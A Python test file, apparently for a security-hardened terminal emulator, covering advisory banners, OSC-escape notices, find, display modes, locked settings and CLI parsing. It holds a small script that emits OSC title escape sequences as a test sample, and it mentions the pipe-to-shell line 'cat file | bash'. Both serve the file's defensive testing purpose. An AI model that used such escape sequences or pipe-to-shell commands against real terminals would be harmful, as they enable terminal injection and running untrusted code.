#!/usr/bin/python3 -Bsu

## Copyright (C) 2026 - 2026 ENCRYPTED SUPPORT LLC <adrelanos@whonix.org>
## See the file COPYING for copying conditions.

## AI-Assisted

"""Offscreen widget tests, half 2: window/settings/launch/IPC, security, TUI grid.

Half of the offscreen widget/window tests; the shared harness (helpers, imports,
APP, pass/fail counters, fmt_of_char, glyph_pt) lives in test_widget_common. Run as
its own process; the coverage gate runs the two halves concurrently and unions it.
"""

from test_widget_common import *   # noqa: F401,F403  (shared harness)

# Every top-level import half 1 makes; half 2 needs its own copy (all stateless).
from PyQt6.QtWidgets import QPlainTextEdit as _QPTE
from PyQt6.QtGui import QResizeEvent as _QRE
from PyQt6.QtCore import Qt as _Qt
from PyQt6.QtGui import QMouseEvent as _QME
from PyQt6.QtCore import QPointF as _QPF
from secure_terminal.terminal import _BRACKETED_PASTE_MODE as _BPM
import re
from PyQt6.QtGui import QWheelEvent, QMouseEvent as _QME, QFocusEvent as _QFEv
from PyQt6.QtCore import QPoint as _QP, QPointF as _QPF, QEvent
from PyQt6.QtGui import QTextCursor as _QTC_hit
from secure_terminal.sanitize import scan_mouse_modes
import time as _tz
from secure_terminal import sanitize as _S_zw
import secure_terminal.terminal as _T_fg
import secure_terminal.terminal as _T_cov
from PyQt6.QtWidgets import QPushButton as _QPushButton
from PyQt6.QtCore import QPoint as _QPoint
from PyQt6.QtCore import Qt as _QtIP
from PyQt6.QtWidgets import QLabel as _QLabelIP
from PyQt6.QtGui import QMouseEvent, QTextCursor
from PyQt6.QtCore import QPointF
import time as _time
from secure_terminal import sanitize as _S
from secure_terminal.terminal import _CP_PROP as _CPP, BOX as _BX, _GridRow as _GR
from secure_terminal.terminal import _MARK_CACHE_MAX
import tempfile as _tfcwd
from secure_terminal.terminal import _CP_PROP
from PyQt6.QtWidgets import QLabel, QPushButton
from PyQt6.QtGui import QGuiApplication
from PyQt6.QtCore import QPoint
from PyQt6.QtCore import QMimeData as _QMimePaste
from secure_terminal.terminal import _argv_for_command as _argv
from secure_terminal.terminal import _argv_for_command as _afc44
import base64 as _b64_osc
import time as _t5
from PyQt6.QtGui import QTextCursor as _QTC
from secure_terminal.terminal import THEMES as _THEMES2, _rgb as _rgb4
from secure_terminal.sanitize import too_close as _tc4
from PyQt6.QtGui import QColor as _QC4
from PyQt6.QtGui import QGuiApplication as _QGA3
from PyQt6.QtCore import QPoint as _QPoint2
from PyQt6.QtGui import QGuiApplication as _QGA_ora
from PyQt6.QtWidgets import QToolTip
from PyQt6.QtGui import QHelpEvent

# --- window: rename, colour, settings round-trip ------------------------------
from secure_terminal.main import (                   # noqa: E402
    MainWindow, _is_font_noise, _read_version, APP_VERSION,
)
from secure_terminal import settings                 # noqa: E402

# version: baked from debian/changelog at build, read at runtime, fail open
eq(_read_version(['/no/such/version']), 'unknown', 'missing version file -> unknown')
_vfd, _vf = tempfile.mkstemp(prefix='st-version-')
os.close(_vfd)
with open(_vf, 'w', encoding='utf-8') as _vh:
    _vh.write('1.2.3-4\n')
eq(_read_version([_vf]), '1.2.3-4', 'version file is read and stripped')
os.remove(_vf)
ok(isinstance(APP_VERSION, str) and APP_VERSION, 'APP_VERSION is a non-empty string')

# font-shaping warning filter: the qt.text.font.db flood is dropped, real
# messages pass through
ok(_is_font_noise('qt.text.font.db', 'OpenType support missing for "X", script 9'),
   'font-db warning is noise')
ok(_is_font_noise('', 'OpenType support missing for "Y"'), 'OpenType line is noise')
ok(not _is_font_noise('default', 'some real warning'), 'real message is not noise')
# #11: only the OpenType-missing message is noise -- a DIFFERENT qt.text.font.db warning
# (e.g. a font substitution that may reintroduce a confusable) must still reach stderr.
# The pre-fix `category == 'qt.text.font.db' or ...` swallowed the whole category.
ok(not _is_font_noise('qt.text.font.db', 'Populating font family aliases took 50 ms'),
   'a non-OpenType qt.text.font.db warning is NOT suppressed (only the flood message is)')

win = MainWindow()
win.new_tab()
# an advisory from a terminal surfaces as the window's dismissible banner, OUTSIDE
# any terminal document (never injected, so it cannot be copied as program output).
from PyQt6.QtWidgets import QPushButton as _QPushButton     # noqa: E402
# isHidden(), not isVisible(): the top-level window is never show()n here, so
# isVisible() is False for any child; isHidden() reflects the widget's own flag.
ok(win._banner.isHidden(), 'the advisory banner starts hidden')
win.current().advise_signal.emit('switch to TUI mode to view this program')
ok(not win._banner.isHidden() and 'TUI' in win._banner_label.text(),
   'a terminal advisory shows the window banner (not injected into the terminal)')
ok('switch to TUI' not in win.current().toPlainText(),
   'the advisory text is not injected into the terminal document')
win._banner.findChild(_QPushButton).click()                # the close (X) button
ok(win._banner.isHidden(), 'the banner X button dismisses it')
# an advisory belongs to the tab that raised it, not the whole window: it shows
# only while that tab is current, never over an unrelated tab (codex P2 fix).
ok(win.tabs.count() >= 2, 'two tabs available for the per-tab banner check')
_tabA = win.tabs.widget(0)
_tabB = win.tabs.widget(1)
win.tabs.setCurrentWidget(_tabA)
_tabA.advise_signal.emit('tab A: switch to TUI mode')
ok(not win._banner.isHidden() and 'tab A' in win._banner_label.text(),
   'the advisory shows while its own tab (A) is current')
win.tabs.setCurrentWidget(_tabB)
ok(win._banner.isHidden(), 'the advisory does not hang over a different tab (B)')
win.tabs.setCurrentWidget(_tabA)
ok(not win._banner.isHidden() and 'tab A' in win._banner_label.text(),
   'switching back to tab A shows its own advisory again')
win._dismiss_advisory()
ok(win._banner.isHidden(), 'dismiss clears the current tab advisory')
# OSC-use notice: a program using an OSC escape (stripped in CLI mode) raises the
# banner at most once per TYPE per tab; the type is named.
ok(win._osc_notice, 'the OSC-use notice is on by default')
_octab = win.current()
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab}
_octab.osc_used.emit('osc_clipboard')
ok(not win._banner.isHidden() and 'clipboard' in win._banner_label.text().lower(),
   'an OSC escape raises the notice banner, naming the type')
win._dismiss_advisory()
_octab.osc_used.emit('osc_clipboard')   # the SAME type again does not re-show
ok(win._banner.isHidden(), 'the OSC notice fires only once per type per tab')
_octab.osc_used.emit('osc_hyperlink')   # a DIFFERENT type does show
ok(not win._banner.isHidden() and 'hyperlink' in win._banner_label.text().lower(),
   'a different OSC type raises its own notice')
win._dismiss_advisory()
# disabled globally: a fresh tab's OSC shows nothing; re-enabling re-arms it.
win.new_tab()
_octab2 = win.current()
win.set_osc_notice(False)
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_clipboard')
ok(win._banner.isHidden(), 'the OSC notice is suppressed when notices are all off')
ok((_octab2, 'osc_clipboard') not in win._osc_notified,
   'a suppressed notice does not consume the per-type state')
win.set_osc_notice(True)
_octab2.osc_used.emit('osc_clipboard')
ok(not win._banner.isHidden(), 're-enabling the toggle re-arms the OSC notice')
win._dismiss_advisory()
# per-TYPE mute: muting clipboard notices silences that type but not others.
win.set_osc_notice_type('osc_clipboard', False)
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_clipboard')
ok(win._banner.isHidden(), 'a per-type muted OSC notice does not show')
_octab2.osc_used.emit('osc_colors')
ok(not win._banner.isHidden(), 'a non-muted OSC type still notifies')
win.set_osc_notice_type('osc_clipboard', True)
win._dismiss_advisory()
# turning notices OFF while showing dismisses the banner immediately.
_octab2.osc_used.emit('osc_cwd')
win.set_osc_notice(False)
ok(win._banner.isHidden(), 'switching OSC notices off dismisses a showing banner')
win.set_osc_notice(True)
# enabling "allow title / notifications" clears a stale OSC notice.
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_title')
ok(not win._banner.isHidden(), 'an OSC notice is showing again')
win.set_allow_title(True)
ok(win._banner.isHidden(), 'enabling program title/notifications clears the OSC notice')
win.set_allow_title(False)
win._dismiss_advisory()
# granular OSC controls: a per-feature menu toggle for every OSC feature, applied
# to the tab, persisted, and reflected by the OSC security lamp (green/yellow/red).
ok(set(win._osc_actions) == {f[0] for f in _S.OSC_FEATURES},
   'every OSC feature has its own menu toggle')
ok(win._osc_level()[0] == '#1f8a54', 'the OSC lamp is green when all features are off')
win.set_osc('osc_hyperlink', True)                    # medium risk
ok(win._osc_level()[0] == '#e5a50a' and win.current().osc_enabled('osc_hyperlink')
   and win._osc_actions['osc_hyperlink'].isChecked(),
   'enabling a medium OSC feature dims the lamp to yellow, applies to the tab, checks the menu')
win.set_osc('osc_clipboard', True)                    # high risk
ok(win._osc_level()[0] == '#e5484d', 'enabling a high-risk OSC feature turns the lamp red')
win.set_osc('osc_hyperlink', False)
win.set_osc('osc_clipboard', False)
ok(win._osc_level()[0] == '#1f8a54', 'the lamp returns to green when the features are disabled')
# and the terminal actually EMITS osc_used (once) when a PROGRAM sends OSC to its
# stdout in line mode, and never shows the OSC text in the document. Drive it from
# a program (not typed input, which the tty would echo back in caret form).
_oscsh = os.path.join(tempfile.mkdtemp(prefix='st-osc-'), 'osc.sh')
with open(_oscsh, 'w') as _f:
    _f.write('#!/bin/sh\n'
             'printf "\\033]2;secret-title\\007visible\\n"\n'
             'printf "\\033]0;another\\007more\\n"\n'
             'sleep 2\n')
os.chmod(_oscsh, 0o700)
oscterm = SecureTerminal(command=_oscsh)
_oscfired = []
oscterm.osc_used.connect(lambda key: _oscfired.append(key))
oscterm.resize(400, 200)
oscterm.show()
pump(300)
ok(len(_oscfired) >= 1, 'the terminal emits osc_used for OSC output in CLI mode')
_osctext = oscterm.toPlainText()
ok('secret-title' not in _osctext and 'another' not in _osctext,
   'the OSC title text is never shown in the document')
ok('visible' in _osctext, 'the program output around the OSC still shows')
# finding: in TUI mode an OSC is NOT flagged "ignored" -- a title/notification may
# be handled there (allow_title), so a contradictory notice must not fire.
if tui_available():
    _tuiosc = SecureTerminal(command=_oscsh, tui=True)
    _tuifired = []
    _tuiosc.osc_used.connect(lambda key: _tuifired.append(key))
    _tuiosc.resize(400, 200)
    _tuiosc.show()
    pump(300)
    ok(not _tuifired, 'TUI mode does not flag an OSC as ignored (it may be handled)')
# turning on TUI mode auto-dismisses a "use TUI mode" (tui-kind) advisory, but NOT
# an unrelated OSC notice on the same tab (codex P2: only TUI hints are stale).
# Box mode so the switch raises no auto-Box notice of its own -- this asserts the
# tui-hint/OSC-notice handling in isolation.
_tuitab = win.current()
win.set_mode('box')
win._on_advise(_tuitab, 'This program wants a full-screen interface. Turn on TUI.')
ok(not win._banner.isHidden(), 'the full-screen advisory is showing before the switch')
win.set_tui(True)
ok(win._banner.isHidden(), 'switching to TUI auto-dismisses the "use TUI mode" banner')
win.set_tui(False)
win._on_advise(_tuitab, 'An application used an OSC escape ...', 'osc')
ok(not win._banner.isHidden(), 'an OSC notice is showing')
win.set_tui(True)
ok(not win._banner.isHidden(), 'enabling TUI does NOT dismiss the OSC notice')
win.set_tui(False)
win._dismiss_advisory()
QInputDialog.getText = staticmethod(lambda *a, **k: ('build', True))
win.rename_tab(0)
eq(win.tabs.tabText(0), 'build', 'tab rename')
win.set_tab_color(0, QColor('#d83933'))
ok(not win.tabs.tabIcon(0).isNull(), 'tab colour set')
_term0 = win.tabs.widget(0)
ok(win._tab_colors.get(_term0) == '#d83933', 'tab colour stored')
win.set_tab_color(0, None)
# the numbered swatch is unconditional, so a null icon can never be the signal;
# _tab_colors is the only state that answers the question.
ok(not win.tabs.tabIcon(0).isNull(), 'tab keeps its number icon after colour cleared')
ok(win._tab_colors.get(_term0) is None, 'tab colour cleared')
# COR-6: the Custom... colour picker returns an INVALID QColor on Cancel, which
# set_tab_color folds into its Clear path -- so passing it straight through erased the
# tab's colour on Cancel. _pick_custom_tab_color guards on isValid(): Cancel is a no-op.
from PyQt6.QtWidgets import QColorDialog as _QCD              # noqa: E402
ok(hasattr(win, '_pick_custom_tab_color'),
   'COR-6: a guarded custom-colour picker (isValid) exists')
if hasattr(win, '_pick_custom_tab_color'):
    win.set_tab_color(0, QColor('#d83933'))
    _o_getcolor = _QCD.getColor
    try:
        _QCD.getColor = staticmethod(lambda *a, **k: QColor())            # invalid = Cancel
        win._pick_custom_tab_color(0)
        ok(win._tab_colors.get(_term0) == '#d83933',
           'COR-6: Custom... Cancel (invalid QColor) leaves the tab colour unchanged')
        _QCD.getColor = staticmethod(lambda *a, **k: QColor('#1f8a54'))   # a real pick
        win._pick_custom_tab_color(0)
        ok(win._tab_colors.get(_term0) == '#1f8a54',
           'COR-6: Custom... with a valid pick applies the colour')
    finally:
        _QCD.getColor = _o_getcolor
        win.set_tab_color(0, None)

# COR-4: a COPY review held with the terminal focused -- Enter/Esc must dispatch the COPY
# reject, not the paste path (which would clear _pending_paste and strand _pending_copy).
_cr = SecureTerminal(command='/bin/cat', tui=True)
_cr.apply_copy_warn('always')
feed_output(_cr, b'hello')
QGuiApplication.clipboard().setText('SENTINEL')
_cr.selectAll()
_cr.copy()
ok(_cr._pending_copy is not None and _cr._review_active,
   'COR-4 setup: selectAll + copy opens a pending copy review')
key(_cr, Qt.Key.Key_Return)
ok(_cr._pending_copy is None,
   'COR-4: Enter on a copy review dispatches the copy reject (no stale _pending_copy)')
_cr.close()
# --- find in scrollback: per-tab + all-tabs, over the neutralized display text ---
from PyQt6.QtGui import QTextCursor as _QTC                  # noqa: E402
_ft = win.current()
_ft.document().setPlainText('')
# Reset the LINE state with the document: the shell's prompt is still in the cell
# buffer, so the fed text would continue that row and autowrap mid-word once the
# prompt is long enough -- making the match count depend on the cwd's length.
_ft._line_cells, _ft._line_col, _ft._out_cursor = [], 0, None
feed_output(_ft, b'alpha beta\r\ndelta alpha\r\nzeta ALPHA\r\nno match\r\n')
win.show_find()
ok(not win._find_bar.isHidden(), 'Ctrl+Shift+F shows the find bar')
win._find_bar.all_tabs.setChecked(False)
win._find_bar.case.setChecked(False)
win._find_bar.input.setText('alpha')
win._find_update()
ok(len(_ft.extraSelections()) == 3,
   'case-insensitive find highlights every match (alpha x2 + ALPHA)')
eq(win._find_bar.count.text(), '3 matches', 'the match count is shown')
win._find_bar.case.setChecked(True)
win._find_update()
ok(len(_ft.extraSelections()) == 2, 'case-sensitive find excludes ALPHA')
# next/prev move the caret to a match and it is a real selection of the query
win._find_bar.case.setChecked(False)
win._find_update()
win._find_step(False)
ok(_ft.textCursor().selectedText().lower() == 'alpha',
   'Next selects a match')
# the find only ever sees display text: a query for an escape byte finds nothing
win._find_bar.input.setText('\x1b')
win._find_update()
eq(win._find_bar.count.text(), 'no matches',
   'a search for an escape byte finds nothing (only neutralized text is searchable)')
# all-tabs search: a match in ANOTHER tab is found and activates that tab
win._find_bar.input.setText('alpha')
win.new_tab()
_ft2 = win.current()
_ft2.document().setPlainText('')
feed_output(_ft2, b'unique-needle-xyz here\r\n')
win.tabs.setCurrentIndex(win.tabs.indexOf(_ft))    # start on the first tab
win._find_bar.all_tabs.setChecked(True)
win._find_bar.input.setText('unique-needle-xyz')
win._find_update()
win._find_step(False)
eq(win.current(), _ft2, 'all-tabs Next hops to the tab that has the match')
# tooltips render as an interactive, zoom-aware InfoTip (selectable + copyable),
# not the plain QToolTip you cannot enter.
from PyQt6.QtGui import QHelpEvent as _QHelpEvent            # noqa: E402
from PyQt6.QtCore import QEvent as _QEvent, QPoint as _QP    # noqa: E402
_tipbtn = _QPushButton('TUI')
_tipbtn.setToolTip('Opt-in TUI mode: higher risk, only run programs you trust.')
_filt = win._tip_filter
_he = _QHelpEvent(_QEvent.Type.ToolTip, _QP(3, 3), _tipbtn.mapToGlobal(_QP(3, 3)))
ok(_filt.eventFilter(_tipbtn, _he) is True,
   'the tooltip event is intercepted (plain QToolTip suppressed)')
_tip = _filt._tip
ok(not _tip.isHidden(), 'an InfoTip is shown for a tooltip')
ok('only run programs you trust' in _tip.text(), 'the InfoTip carries the tooltip text')
ok(bool(_tip.textInteractionFlags()
        & Qt.TextInteractionFlag.TextSelectableByMouse),
   'the InfoTip text is selectable (can be copied)')
# the InfoTip font scales with the current tab zoom
win.current().apply_zoom(200)
_he2 = _QHelpEvent(_QEvent.Type.ToolTip, _QP(3, 3), _tipbtn.mapToGlobal(_QP(3, 3)))
_filt.eventFilter(_tipbtn, _he2)
_big = _tip.font().pointSizeF()
win.current().apply_zoom(100)
_filt.eventFilter(_tipbtn, _he2)
_small = _tip.font().pointSizeF()
ok(_big > _small, 'the InfoTip font grows with zoom')
_tip.hide()
win.hide_find()
ok(win._find_bar.isHidden(), 'Esc/close hides the find bar')
ok(len(_ft.extraSelections()) == 0 and len(_ft2.extraSelections()) == 0,
   'closing find clears all match highlights')
# window tab actions: previous-tab wraps around, goto jumps by position, select
# all selects the current buffer, full screen toggles
win.new_tab()
win.new_tab()
_cnt = win.tabs.count()
win.tabs.setCurrentIndex(0)
win._on_tab_step(-1)
eq(win.tabs.currentIndex(), _cnt - 1, 'previous-tab wraps to the last tab')
win._goto_tab(0)
eq(win.tabs.currentIndex(), 0, 'goto tab 1 by position')
win.current()._append('pick me')
win.select_all()
ok(bool(win.current().textCursor().selectedText()), 'select all selects the buffer')
win.toggle_fullscreen(True)
ok(win.isFullScreen(), 'full screen on')
win.toggle_fullscreen(False)
# unicode display is four mutually-exclusive buttons (Box/Reveal/Detail/Show),
# default detail, colour-coded by safety
win.act_box.trigger()
ok(win.act_box.isChecked() and win.current().current_mode() == 'box',
   'Box button selects box')
win.act_show.trigger()
_checked = sum(a.isChecked() for a in (win.act_box, win.act_reveal, win.act_show))
eq((win.current().current_mode(), _checked), ('show', 1),
   'Show button selects show, exclusively (only one checked)')
win.act_reveal.trigger()
eq(win.current().current_mode(), 'reveal', 'Reveal button selects reveal')
ok(not win.act_box.icon().isNull() and not win.act_show.icon().isNull(),
   'mode buttons carry icons')
# security indicator: two lamps. display axis (show=red, reveal=green [safe and
# lossless], box=green [safe -- the neutralized char is a hard-to-miss coloured
# box, though lossy]) and mode axis (TUI=yellow, line=green).
win.set_mode('box')
eq((win._display_level()[1], win._display_level()[0]), ('Box', '#1f8a54'),
   'box display -> green (safe; the box placeholder is hard to miss)')
win.set_mode('reveal')
eq((win._display_level()[1], win._display_level()[0]), ('Reveal', '#1f8a54'),
   'reveal display -> green (safe and lossless, not red)')
win.set_mode('show')
eq((win._display_level()[1], win._display_level()[0]), ('Show', '#d83933'),
   'show display -> red')
# the box display mode is labelled "Box" (it draws a box; it does not strip the
# data stream), and its tooltip says it is a DISPLAY setting -- not the bytes a
# program pipes elsewhere, so "cat file | bash" runs regardless.
eq(win.act_box.text(), '&Box', 'the box display mode is user-labelled Box')
ok('cat file | bash' in win.act_box.toolTip(),
   'the Box tooltip clarifies it is display-only, not bytes piped elsewhere')
eq(win._mode_level()[1], 'CLI', 'CLI mode -> green mode lamp')
if tui_available():
    win.set_tui(True)
    eq((win._mode_level()[1], win._mode_level()[0]), ('TUI', '#e5a50a'),
       'TUI -> yellow mode lamp (independent of the display lamp)')
    win.set_tui(False)
    # Box and Show already render full-screen, so entering TUI leaves them as the
    # user set them (no auto-switch, no restore state).
    win.set_mode('box')
    win.set_tui(True)
    eq(win.current().current_mode(), 'box', 'TUI leaves Box as Box (renders full-screen)')
    ok(win.current() not in win._pre_tui_mode, 'a Box tab needs no restore state in TUI')
    win.set_tui(False)
    # Reveal/Detail cannot expand a codepoint in the fixed grid, so entering TUI
    # auto-switches this TAB to Box (which still marks every byte) WITHOUT persisting
    # Box as the global default, and disables the Reveal/Detail controls. Turning
    # TUI off restores the prior mode and re-enables them.
    win.set_mode('detail')
    win.set_tui(True)
    eq(win.current().current_mode(), 'box', 'TUI auto-switches Detail to Box')
    eq(win._default_mode, 'detail',
       'TUI does NOT persist the auto-Box as the global default')
    ok(not win.act_reveal.isEnabled() and not win.act_detail.isEnabled(),
       'Reveal/Detail controls are disabled while the tab is in TUI')
    ok(win.act_box.isEnabled() and win.act_show.isEnabled(),
       'Box and Show stay selectable in TUI')
    ok(not win._mode_buttons['reveal'].isEnabled()
       and not win._mode_buttons['detail'].isEnabled(),
       'the Reveal/Detail toolbar chips are disabled in TUI too')
    win.set_tui(False)
    eq(win.current().current_mode(), 'detail',
       'turning TUI off restores the prior mode (Detail)')
    ok(win.act_reveal.isEnabled() and win.act_detail.isEnabled(),
       'Reveal/Detail re-enabled after leaving TUI')
    ok(win._mode_buttons['reveal'].isEnabled()
       and win._mode_buttons['detail'].isEnabled(),
       'the Reveal/Detail chips re-enabled after leaving TUI')
    win.set_mode('box')

# The passive "switched to Box" notice: fires on the auto-switch when on, clears on
# CLI, and stays silent when the setting is off (the switch itself is unconditional).
if tui_available():
    _nt = win.current()
    win.set_tui(False)
    win._dismiss_advisory()                    # start from a clean banner
    win.set_tui_autobox_notice(True)
    win.set_mode('detail')
    win.set_tui(True)
    eq(win._advisories.get(_nt, (None,))[0], 'autobox',
       'entering TUI raises the auto-Box notice when the setting is on')
    ok(not win._banner.isHidden(), 'the auto-Box banner is showing')
    win.set_tui(False)
    ok(win._advisories.get(_nt) is None,
       'leaving TUI clears the auto-Box notice and restores the mode')
    eq(win.current().current_mode(), 'detail', 'the prior mode (Detail) is restored')
    # notice OFF: the tab still boxes, but no banner is raised
    win.set_tui_autobox_notice(False)
    win.set_mode('reveal')
    win.set_tui(True)
    eq(win.current().current_mode(), 'box',
       'the auto-Box switch still happens with the notice off')
    ok(win._advisories.get(_nt) is None, 'the notice off raises no banner')
    win.set_tui(False)
    # a showing notice is dropped the moment the setting is switched off
    win.set_tui_autobox_notice(True)
    win.set_mode('detail')
    win.set_tui(True)
    ok(win._advisories.get(_nt, (None,))[0] == 'autobox', 'a notice is showing')
    win.set_tui_autobox_notice(False)
    ok(win._advisories.get(_nt) is None,
       'switching the notice off clears a showing auto-Box banner')
    win.set_tui(False)
    win.set_tui_autobox_notice(True)
    win.set_mode('box')

# the /mode slash command is refused for Reveal/Detail while the tab owns the TUI
# grid (it bypasses the disabled chips, so the choke point is in set_mode).
if tui_available():
    win.set_mode('box')
    win.set_tui(True)
    win.run_command('mode reveal')
    eq(win.current().current_mode(), 'box',
       '/mode reveal is refused while the tab is in TUI (mode unchanged)')
    win.run_command('mode show')
    eq(win.current().current_mode(), 'show',
       '/mode show still applies in TUI (Show renders full-screen)')
    win.set_tui(False)
    win.set_mode('box')

# an admin-locked display mode is a deliberate hardening choice: entering TUI must
# NOT auto-switch it, and the controls are left to _apply_locks (not re-enabled).
if tui_available():
    _lm = win.current()
    win.set_tui(False)
    _lm.apply_mode('detail')               # force the term mode past the locked setter
    _saved_locks = set(win._locked)
    try:
        win._locked = {'unicode_mode'}
        win.set_tui(True)
        eq(_lm.current_mode(), 'detail',
           'a locked mode is respected: TUI does not auto-Box it')
    finally:
        win._locked = _saved_locks
        win.set_tui(False)
    _lm.apply_mode('box')
    win.set_mode('box')

# a closed auto-Boxed tab must not linger in _pre_tui_mode (else the terminal leaks)
if tui_available():
    win.set_mode('detail')
    win.new_tab(tui=True)                       # a TUI tab born in Detail -> auto-Boxed
    _leak = win.current()
    ok(_leak in win._pre_tui_mode, 'the auto-Boxed tab recorded its pre-TUI mode')
    win.close_tab(win.tabs.indexOf(_leak))
    ok(_leak not in win._pre_tui_mode,
       'closing an auto-Boxed tab clears its _pre_tui_mode entry (no leak)')
    win.set_mode('box')

# the autobox notice must NOT clobber a pending OSC notice (security-relevant, de-duped):
# the greyed controls convey the switch, so the OSC banner wins the one-per-tab slot.
if tui_available():
    _oc = win.current()
    win.set_tui(False)
    win._dismiss_advisory()
    win.set_tui_autobox_notice(True)
    win.set_mode('detail')
    win._on_advise(_oc, 'An application used an OSC escape ...', 'osc')
    eq(win._advisories.get(_oc, (None,))[0], 'osc', 'an OSC notice is pending')
    win.set_tui(True)                           # auto-Box fires, but must not clobber osc
    eq(win.current().current_mode(), 'box', 'the tab still auto-switched to Box')
    eq(win._advisories.get(_oc, (None,))[0], 'osc',
       'the pending OSC notice survives the auto-Box (not clobbered)')
    win.set_tui(False)
    win._dismiss_advisory()
    win.set_mode('box')

# a plain tab switch must not mutate persisted settings (setChecked on toggled
# actions is blocked): flip colours off on tab B, switch away and back.
_before_colors = win._default_colors
win.new_tab()
win.set_colors(not _before_colors)
_toggled = win._default_colors
win._goto_tab(0)                       # switch away (fires setChecked, blocked)
win._goto_tab(win.tabs.count() - 1)    # and back
eq(win._default_colors, _toggled, 'tab switch does not rewrite the colours default')
win.set_colors(_before_colors)         # restore the shared window's colours default (isolation)
win.set_mode('box')
ok(not win.sec_display.icon().isNull() and not win.sec_mode.icon().isNull(),
   'both security lamps show an icon')
# About dialog builds without error (patch exec so the modal does not block)
from PyQt6.QtWidgets import QDialog as _QDialog          # noqa: E402
_orig_exec = _QDialog.exec
_QDialog.exec = lambda _self: 0
try:
    win.show_about()
    win._show_security_details()
    ok(True, 'About + security-detail dialogs build without error')
finally:
    _QDialog.exec = _orig_exec
# global settings apply to every open tab and update the defaults
win.new_tab()
win._apply_global({'theme': 'light', 'zoom': 130, 'mode': 'reveal',
                   'colors': True, 'line_edits': True, 'tui': False,
                   'tui_autobox_notice': True,
                   'osc': {'osc_title': True, 'osc_clipboard': True},
                   'scrollback': 1000, 'paste_delay': 5, 'escape_limit': 4096,
                   'persist': True})
ok(all((win.tabs.widget(i).current_theme(), win.tabs.widget(i).current_mode(),
        win.tabs.widget(i).current_scrollback()) == ('light', 'reveal', 1000)
       for i in range(win.tabs.count())),
   'global settings applied to every open tab')
ok(all(win.tabs.widget(i).osc_enabled('osc_title')
       and win.tabs.widget(i).osc_enabled('osc_clipboard')
       for i in range(win.tabs.count())),
   'global settings apply the granular OSC toggles to every tab')
win._apply_global({'theme': 'light', 'zoom': 130, 'mode': 'reveal', 'colors': True, 'line_edits': True,
                   'tui': False, 'tui_autobox_notice': True,
                   'osc': {'osc_title': False, 'osc_clipboard': False},
                   'scrollback': 1000, 'paste_delay': 5, 'escape_limit': 4096,
                   'persist': True})
eq(win._default_mode, 'reveal', 'global settings updated the default mode')
# slash-command palette: applies settings, leading slash optional, invalid -> False
ok(win.run_command('/theme light') and win.current().current_theme() == 'light',
   'command /theme light')
ok(win.run_command('mode reveal') and win.current().current_mode() == 'reveal',
   'command mode reveal (no leading slash)')
ok(win.run_command('/colors on') and win.current().colors_enabled(),
   'command /colors on')
ok(win.run_command('/zoom 150') and win.current().current_zoom() == 150,
   'command /zoom 150')
ok(not win.run_command('/bogus xyz'), 'unknown command returns False')
win.set_theme('light')
win.set_zoom(140)
win.set_mode('reveal')
win.close()
cfg = settings.load()
eq(cfg.get('theme'), 'light', 'setting persisted theme')
eq(cfg.get('zoom'), '140', 'setting persisted zoom')
eq(cfg.get('unicode_mode'), 'reveal', 'setting persisted mode')

# --- admin-locked settings (hardening: a privileged drop-in wins, user ignored)
_sysd = tempfile.mkdtemp(prefix='st-sys-')
_usrd = tempfile.mkdtemp(prefix='st-usr-')
_orig_sys, _orig_usr = settings._system_dirs, settings._user_config_dir
settings._system_dirs = lambda: [_sysd]
settings._user_config_dir = lambda: _usrd
try:
    with open(os.path.join(_sysd, '30_default.conf'), 'w') as _f:
        _f.write('tui=false\ncolors=false\nunicode_mode=box\n'
                 'lock=tui,colors,unicode_mode\n')
    with open(os.path.join(_usrd, '50_user.conf'), 'w') as _f:
        _f.write('colors=true\ntui=true\ntheme=light\nlock=colors\n')
    lc = settings.load()
    eq(lc.get('colors'), 'false', 'locked colours keep the admin value')
    eq(lc.get('tui'), 'false', 'locked tui keeps the admin value')
    eq(lc.get('theme'), 'light', 'an UNlocked key still lets the user win')
    eq(sorted(lc.locked), ['colors', 'remote_control', 'tui', 'unicode_mode'],
       'locked = admin locks + the always-privileged remote_control')
    eq(sorted(lc.violations), ['colors', 'tui'],
       'ignored user overrides of locked keys are recorded')
    # the window disables the locked controls and guards the setters
    lw = MainWindow()
    ok(not lw.act_colors.isEnabled() and not lw.act_tui.isEnabled()
       and all(not a.isEnabled() for a in lw._mode_actions.values()),
       'locked controls are greyed out in the UI')
    ok(lw._locked_violations, 'the window surfaces the locked-override violation')
    lw.set_colors(True)
    ok(not lw._default_colors, 'set_colors is a no-op when colours are locked')
    lw.set_mode('show')
    ok(lw._default_mode != 'show', 'set_mode is a no-op when the mode is locked')
    lw.close()
    # save() must never write a locked key back to the (dead) user config
    settings.save({'colors': 'true', 'theme': 'dark'}, locked=lc.locked)
    with open(settings.user_config_file()) as _wf:
        _written = _wf.read()
    ok('colors=' not in _written and 'theme=dark' in _written,
       'save drops locked keys, keeps unlocked ones')
finally:
    settings._system_dirs, settings._user_config_dir = _orig_sys, _orig_usr

# --- launch CLI parsing (--title/--tui/--mode/--class/--tab/-- command) -------
from secure_terminal.main import _parse_launch_args as _pla       # noqa: E402
eq(_pla(['--title', 'logs', '--tui', '--mode', 'reveal']).tabs,
   [{'title': 'logs', 'tui': True, 'mode': 'reveal', 'command': None,
     'colors': None, 'line_edits': None, 'bell': None, 'osc': None}],
   'cli: single-tab options')
# per-tab settings overrides parse into the tab spec
_ps = _pla(['--colors', '--bell', 'audible,visual', '--osc', 'osc_clipboard_read',
            '--osc', 'osc_title']).tabs[0]
eq((_ps['colors'], _ps['bell'], _ps['osc']),
   (True, 'audible,visual', ['osc_clipboard_read', 'osc_title']),
   'cli: per-tab colours/bell/osc(repeatable) parse')
eq(_pla(['--no-colors']).tabs[0]['colors'],
   False, 'cli: --no-colors turns a tab setting off')
# the line-editing opt-out is reachable from the command line too, and a tab that
# only carries it is NOT an empty spec (it must open a tab, not fall through to
# the normal restore-or-default startup)
eq(_pla(['--no-line-edits']).tabs[0]['line_edits'],
   False, 'cli: --no-line-edits opts a tab out of line editing')
eq(_pla(['--line-edits']).tabs[0]['line_edits'],
   True, 'cli: --line-edits opts a tab back in')
eq(len(_pla(['--no-line-edits']).tabs), 1,
   'cli: a --no-line-edits-only spec still counts as a requested tab')
eq(_pla(['--', 'htop', '--no-color']).tabs[0]['command'], ['htop', '--no-color'],
